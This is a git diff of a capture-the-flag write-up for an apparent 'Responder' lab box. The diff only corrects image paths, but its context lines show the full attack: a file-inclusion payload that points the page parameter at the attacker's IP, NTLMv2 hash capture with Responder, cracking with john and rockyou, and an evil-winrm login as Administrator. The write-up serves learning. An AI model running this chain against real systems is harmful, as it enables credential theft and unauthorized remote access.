@@ -10,7 +10,7 @@ How File Inclusion Vulnerability can be exploited to capture NTLMv2 password has
 2. ran: nmap -Pn 'ip addr' to scan the target and discover open ports and services running on the ports.
 Discovered port 80 (http) and port 5985 (wsman)
 
-![nmap scan](responder/images/scan_result.png)
+![nmap scan](images/scan_result.png)
 
 4. connected to the target ip addr with my browser. 
  Note: I could not access unika.htb through the ip address. Added the ip addr and hostname to /etc/hosts to resolve the issue.
@@ -24,19 +24,19 @@ Note: I was on NAT, Responder was listening without capturing, had to switch my 
 modifying "http://unika.htb/index.php?page=german.html" to "http://unika.htb/index.php?page=//'my_tun0_ip_addr'/hello". Access was denied and an error.
 9. Responder successfully captured the NTLMv2 hash. I saved the hash to nthash.hash using: echo "'hash'" > nthash.hash
 
-![NTLMv2 hash](responder/images/res_listening.png)
+![NTLMv2 hash](images/res_listening.png)
 
 10. ran: john --help. Needed flags: --format (netntlmv2) and --wordlist (rockyou.txt).
 11. ran: john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt nthash.hash
 The hash got cracked and I obtained "badminton" as the Administrator password.
 
-![cracked password](responder/images/password_obt.png)
+![cracked password](images/password_obt.png)
 
 12. ran: evil-winrm --help. Needed flags: -i (ip addr) -u (username) -P (port) -p (password). 
 ran: evil-winrm -i "target ip addr" -u Administrator -P 5985 -p badminton
 13. Successfully connected to the target system and got terminal access. 
 
-![access gained](responder/images/access.png)
+![access gained](images/access.png)
 
 14. Navigated to mike (user) directory and got the flag using the following commands: ls, cd and cat.
 
